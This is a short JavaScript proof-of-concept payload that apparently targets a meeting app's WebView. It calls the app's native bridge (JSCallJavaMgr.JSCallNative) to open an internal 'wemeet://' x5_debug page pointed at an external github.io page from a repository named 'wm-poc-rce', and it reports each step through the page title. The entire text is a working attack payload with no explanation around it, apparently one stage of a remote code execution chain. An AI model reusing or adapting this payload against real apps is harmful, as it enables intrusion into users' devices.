(function(){
  document.title='P105PAY:'+location.host;
  window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P105CB:'+(r&&r.callId)+':'+(r&&r.code)};
  if(!window.JSCallJavaMgr){document.title='P105-NOBRIDGE';return}
  var target='https://gitwhs.github.io/wm-poc-rce/p105x5.html';
  setTimeout(function(){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:'CommonPlugin',method:'OpenNewPage',callId:'X5D',param:{scheme:'wemeet://page/profile/aboutus/x5_debug',router_params:{url:target,from_webView:true}}}));
    document.title='P105RUN:X5D';
  },800);
})();
